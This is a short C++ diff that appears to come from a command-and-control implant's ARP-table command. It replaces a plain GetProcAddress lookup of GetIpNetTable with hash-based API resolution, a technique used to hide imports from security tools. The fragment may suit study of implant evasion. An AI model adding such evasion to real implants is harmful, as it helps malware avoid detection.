@@ -62,8 +62,8 @@ auto declfn starburst::cmd_arp(
     }
 
     auto pGetIpNetTable = reinterpret_cast<fn_GetIpNetTable>(
-        inst.kernel32.GetProcAddress( h_iphlpapi,
-            symbol<LPCSTR>( "GetIpNetTable" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_iphlpapi ),
+            expr::hash_string( "GetIpNetTable" ) ) );
     if ( !pGetIpNetTable ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetIpNetTable not found" ) ) );
